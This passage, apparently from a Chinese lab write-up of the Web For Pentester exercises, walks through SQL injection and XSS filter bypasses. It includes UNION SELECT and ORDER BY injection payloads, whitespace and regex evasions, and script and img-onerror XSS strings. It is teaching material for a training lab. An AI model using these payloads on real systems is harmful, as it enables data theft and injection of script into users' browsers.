-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1-5-5.png" alt="1-5-5"></p>
-<p>二、Example 2</p>
-<p>2.1 源代码</p>
-<p>这个源代码中添加了对空格的过滤，并会报错：”ERROER NO SPACE”</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/2-1-1.png" alt="2-1-1"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/2-1-2.png" alt="2-1-2"></p>
-<p>2.2 输入代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=root&apos; and 1=1 %23</span><br></pre></td></tr></table></figure>
-<p>此时就报错了</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/2-2.png" alt="2-2"></p>
-<p>2.3 空格的绕过方法</p>
-<p>Mysql SQL注入绕过空格过滤的方法有几种方法：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">① 对水平制表tab(HT或者\t)进行url编码，即用%09代替空格</span><br><span class="line"></span><br><span class="line">② 使用注释绕过空格，即使用/**/代替空格</span><br><span class="line"></span><br><span class="line">③ 使用括号绕过空格</span><br></pre></td></tr></table></figure>
-<p>（1）使用%09代替空格</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/2-3-1.png" alt="2-3-1"></p>
-<p>（2）and%091=2时，不返回数据</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/2-3-2.png" alt="2-3-2"></p>
-<p>（3）使用/**/代替空格</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/2-3-3.png" alt="2-3-3"></p>
-<p>2.4 找到注入点后就可以注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=root&apos;/**/union/**/select/**/*/**/from/**/users%23</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/2-4.png" alt="2-4"></p>
-<p>三、Example 3</p>
-<p>3.1 源代码</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/3-1-1.png" alt="3-1-1"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/3-1-2.png" alt="3-1-2"></p>
-<p>3.2 \s过滤掉了空格和tab符号</p>
-<p>\s过滤了空格和tab符号，所以不能用%09代替空格了，否者会报错</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/3-2.png" alt="3-2"></p>
-<p>3.3 但是还是可以使用/**/代替空格</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/3-3.png" alt="3-3"></p>
-<p>四、Example 4</p>
-<p>4.1 源代码</p>
-<p>源码可以看出，代码中使用了mysql_real_escape_string()函数过滤了string，但是也仅仅只过滤了string</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/4-1-1.png" alt="4-1-1"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/4-1-2.png" alt="4-1-2"></p>
-<p>4.2 mysql_real_escape_string()函数</p>
-<p>mysql_real_escape_string()函数转义SQL语句中使用的字符串中的特殊字符。受影响的字符包括：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x00、\n、\r、\、&apos;、&quot;和\x1a</span><br></pre></td></tr></table></figure>
-<p>如果成功，则该函数返回被转义的字符串。如果失败，则返回false函数原型为mysql_real_escape_string(string,connection)</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/4-2.png" alt="4-2"></p>
-<p>4.3 </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=2 and 1=1</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/4-3.png" alt="4-3"></p>
-<p>4.4 </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=2 and 1=2</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/4-4.png" alt="4-4"></p>
-<p>4.5 数值型注入</p>
-<p>由4.3和4.4的测试知道，此SQL注入属于数值型的输入。由于过滤了单引号等， 对数值型注入其实没有意义，可以直接注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=2 union select * from users</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/4-5.png" alt="4-5"></p>
-<p>五、Example 5</p>
-<p>5.1 源代码</p>
-<p>可以看出，代码中使用了一个正则表达式来预防SQL注入，不过，这个正则表达式没有用对，因为代码只确保了id参数是以一个数字开头，即只要首字母为数字，则能避过正则表达式的过滤</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/5-1-1.png" alt="5-1-1"></p>
-<p>5.2 </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=2 and 1=1</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/5-2.png" alt="5-2"></p>
-<p>5.3 </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=2 and 1=2</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/5-3.png" alt="5-3"></p>
-<p>5.4</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=2 union select user(),2,3,4,5 %23</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/5-4.png" alt="5-4"></p>
-<p>六、Example 6</p>
-<p>6.1 源代码</p>
-<p>这个正则表达式也没有用对，因为代码只确保了id参数是以一个数字结尾，不能确保id参数的开头是合法的，即只要尾字母为数字，则能避过正则表达式的过滤</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/6-1.png" alt="6-1"></p>
-<p>6.2 </p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/6-2.png" alt="6-2"></p>
-<p>6.3</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/6-3.png" alt="6-3"></p>
-<p>6.4 </p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/6-4.png" alt="6-4"></p>
-<p>七、Example 7</p>
-<p>7.1 源代码</p>
-<p>代码只确保了id参数都以一个数字开头和结尾。但是代码中的正则表达式中有一个修饰符/m，这个符号就是说在几行数据中如果有一行符合正则表达式，那么这行就被匹配到了。所以可以考虑使用换行符，\n的URL编码为%0a</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/7-1.png" alt="7-1"></p>
-<p>7.2 报错</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=2 and 1=1</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/7-2.png" alt="7-2"></p>
-<p>7.3 利用%0a</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=2%0aand 1=1</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/7-3.png" alt="7-3"></p>
-<p>7.4</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=2%0aand 1=2</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/7-4.png" alt="7-4"></p>
-<p>7.5 </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=2%0aunion select user(),2,3,4,5 %23</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/7-5.png" alt="7-5"></p>
-<p>八、Example 8</p>
-<p>8.1 源代码</p>
-<p>使用了mysql_real_escape_string()函数对参数进行过滤</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/8-1.png" alt="8-1"></p>
-<p>8.2 </p>
-<p>8.3</p>
-<p>有两种方法可以在Order by语句后面加一个值，一是直接加，如Order by name；二是在反引号中加，如Order by <code>name</code>。反引号`的作用是可以使用mysql预留的Keyword。Order by语句后面接的值不能在单引号’和或者双引号“中。</p>
-<p>（1）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?order=name`%23</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/8-3-1.png" alt="8-3-1"></p>
-<p>（2）ASC表示升序</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/8-3-2.png" alt="8-3-2"></p>
-<p>（3）DESC表示降序</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/8-3-3.png" alt="8-3-3"></p>
-<p>8.4</p>
-<p>还可以利用别的方式来达到这个目的，如可以直接发送注入请求不用反引号。我们还可以用Mysql if语句来构造更多的攻击语句</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?order=name`,if(1=1,1,(select table_name from information_schema.tables));%23</span><br></pre></td></tr></table></figure>
-<p>此时执行的SQL语句是：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users order by `name`,if(1=1,1,(select table_name from information_schema.tables));#`</span><br></pre></td></tr></table></figure>
-<p>得到的参数为name时相同的结果</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/8-4.png" alt="8-4"></p>
-<p>九、Example 9</p>
-<p>9.1 源代码</p>
-<p>代码中去掉了反引号`的限制 。上一个例子的payload值仍然可以使用，只不过需要去掉name后面的反引号</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/9-1.png" alt="9-1"></p>
-<hr>
-<h1 id="（八）XSS攻击"><a href="#（八）XSS攻击" class="headerlink" title="（八）XSS攻击"></a>（八）XSS攻击</h1><h2 id="【原理】-7"><a href="#【原理】-7" class="headerlink" title="【原理】"></a>【原理】</h2><p>（1）跨站脚本（XSS）的产生是由于信息被发送到用户的时候没有被正确编码。XSS可以被用来注入任意的HTML和JavaScript代码，结果就是XSS的payload运行在合法用户的浏览器中。和其他类型的攻击不同的是，XSS是针对用户，而不是直接针对服务器</p>
-<p>（2）XSS大概的流程一般是：注入一个虚假的登录框；接受合法用户的cookies；注入浏览器；让用户在web应用中执行代码</p>
-<p>（3）有三种类型的XSS：</p>
-<ul>
-<li>反射型：payload直接在响应中出现</li>
-<li>存储型：响应也会直接在响应中，但是更重要的是，当返回原页面或访问其他的页面的时候，payload还是会出现在响应中。这是因为payload被存在了应用程序的数据库中。典型的例子就是留言板中插入XSS</li>
-<li>DOM型：payload不会在响应中出现，但是当浏览器渲染页面的时候，payload就会被执行</li>
-</ul>
-<p>（4）测试XSS的时候，应该赌侠返回的HTML代码，不能坐等alert窗口弹出来。检查哪些字符被编码了，而那些字符没有被编码。由此可能发现一个能工作的payload</p>
-<p>（5）一些浏览器有一些自带的保护措施在一定程度上可以用来抵抗XSS。这个抵抗功能可以被服务器禁用或者开启。如果发现payload在返回页面中出现了，但是并没有执行，那就有可能是这个抵抗功能发生作用了。这时可以关闭这种保护功能【步骤】</p>
-<p>一、Example 1</p>
-<p>1.1 源代码</p>
-<p>没有对payload有任何的过滤或者编码</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/1-1.png" alt="1-1"></p>
-<p>1.2 payload默认为hacker</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/1-2.png" alt="1-2"></p>
-<p>1.3 因为没有任何过滤或者编码，所以直接进行XSS攻击</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&lt;script&gt;alert(&apos;simpleware&apos;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>弹出simpleware</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/1-3.png" alt="1-3"></p>
-<p>二、Example 2</p>
-<p>2.1 源代码</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/2-1.png" alt="2-1"></p>
-<p>2.2 preg_replace()函数进行过滤，所以上面的payload会以名字返回，而不是弹框</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/2-2.png" alt="2-2"></p>
-<p>2.3 因为只对小写进行过滤，我们就可以用大写（首字母）进行绕过</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&lt;Script&gt;alert(&apos;simpleware&apos;)&lt;/Script&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/2-3.png" alt="2-3"></p>
-<p>三、Example 3</p>
-<p>3.1 源代码</p>
-<p>比Example2的源代码多了一个i，表示对前面的正则表达式区分大小写</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/3-1.png" alt="3-1"></p>
-<p>3.2 此时若还是使用之前的首字母大写payload，会以名字形式返回</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/3-2.png" alt="3-2"></p>
-<p>3.3 嵌套的script标签绕过过滤</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=Penterter&lt;script&gt;Lab</span><br></pre></td></tr></table></figure>
-<p>输出PenterterLab，说明使用嵌套的script标签绕过过滤是可行的</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/3-3.png" alt="3-3"></p>
-<p>3.4 双写绕过</p>
-<p>因为只用了一次preg_replace()，其实也就是双写</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&lt;scr&lt;script&gt;ipt&gt;alert(&apos;simpleware&apos;)&lt;/scr&lt;script&gt;ipt&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/3-4.png" alt="3-4"></p>
-<p>四、Example 4</p>
-<p>4.1 源代码</p>
-<p>条件判断，只要包含大小写的script就会一直报错</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/4-1.png" alt="4-1"></p>
-<p>4.2 preg_match()和preg_match_all()</p>
-<p>preg_match()函数匹配成功一次后就会停止匹配</p>
-<p>如果要实现全部结果的匹配，则需要使用preg_match_all()函数</p>
-<p>4.3 使用之前的双写payload，会报错</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/4-3.png" alt="4-3"></p>
-<p>4.4 使用img标签绕过</p>
-<p>注意：因为onerror使用了单引号，alert()函数内要使用双引号，否则会异常</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&lt;img src=&apos;xipu&apos; onerror=&apos;alert(&quot;simple&quot;)&apos; /&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/4-4.png" alt="4-4"></p>
-<p>4.5 常见的让Javascript绕过过滤的方法：</p>
-<p>（1）&lt;a标签中有下面的这些事件：onmouseover（你需要把鼠标放到链接上才能触发payload），onmouseout，onmousermove，onclick….</p>
-<p>（2）&lt;a标签中直接出现在URL中：&lt;a href=”javascript:alert(1)”…（你需要点击链接才能触发JavaScript代码，但是由于在这个例子中不能用script这个单词，所以这个方法在这个例子中实际上不能工作</p>
-<p>（3）&lt;img标签中onerror事件onerror：&lt;img src=’zzzz’ onerror=’alert(1)’ /》</p>
-<p>（4）&lt;div标签中有下面的事件：onmouseover（你需要把鼠标放在那个连接上才能触发payload），onmouseout，onmousemove，onclick…</p>
-<p>五、Example 5</p>
-<p>5.1 源代码</p>
-<p>这次对alert大小写都进行了过滤</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/5-1.png" alt="5-1"></p>
-<p>5.2 再次使用img标签就会报错</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/5-2.png" alt="5-2"></p>
-<p>5.3 alert的替换方法</p>
-<p>因为源码检测到有alert，会报错并停止，所以不能再使用alert()函数。此时有两种方法：</p>
-<p>一是使用JavaScript中的eval和String.fromCharCode()，String.fromCharCode()函数会将一个整数编码到对应的字符中。用这个小技巧和ascii码表，可以轻易地产生字符串alert并且调用eval()函数执行它</p>
-<p>二是使用JavaScript代码中的prompt、userprompt或者confirm函数，这两个函数比较少见，但是可以产生相同的效果</p>
-<p>5.4 使用String.fromCharCode()函数</p>
-<p>String.fromCharCode(97,108,101,114,116)相当于alert</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116))(&apos;simpleware&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/5-4.png" alt="5-4"></p>
-<p>5.5 </p>
-<p>String.fromCharCode()函数可接受一个指定的Unicode值，然后返回一个字符串</p>
-<p>5.6 使用prompt()函数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&lt;script&gt;prompt(&apos;simpleware&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/5-6.png" alt="5-6"></p>
-<p>5.7 prompt()函数</p>
-<p>用于显示一个带有提示信息，并且用户可输入信息的对话框</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/5-7.png" alt="5-7"></p>
-<p>六、Example 6</p>
-<p>6.1 源代码</p>
-<p>此代码中，发送的payload是在Javascript代码中执行的。为了实现XSS攻击，现在payload中不需要script标签了，只需要注入已完成前面的已经存在的JS代码和添加自己的payload，然后在注入点处把后面的代码用//都注释掉或者添加一些多余的代码（var $dummy=”）来把后面的代码正确关闭掉。因为直接在js环境中输出php变量，所以可以考虑通过构造js脚本进行过滤</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/6-1.png" alt="6-1"></p>
-<p>6.2 构造payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=xipu&quot;;alert(&apos;simpleware&apos;)//</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/6-2.png" alt="6-2"></p>
-<p>七、Example 7</p>
-<p>7.1 源代码</p>
-<p>与上一个例子类似，只是多使用了一个函数htmlentities()对payloads进行了html编码。因为在js环境中输出通过html编码的php变量，而htmlentities没有过滤单引号，所以可以考虑使用单引号进行绕过</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/7-1.png" alt="7-1"></p>
-<p>7.2 构造payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=xipu&apos;;alert(&apos;simpleware&apos;)//</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/7-2.png" alt="7-2"></p>
-<p>八、Example 8</p>
-<p>8.1 源代码</p>
-<p>有源码可以知道，payload都已经被合适地编码过了。不过，页面中还是存在一个XSS，为了构成表单，程序开发者使用了PHP_SELF，这个变量是受用户控制的，由于POST地址使用了当前URL，可以考虑构造当前URL地址达到XSS目的</p>
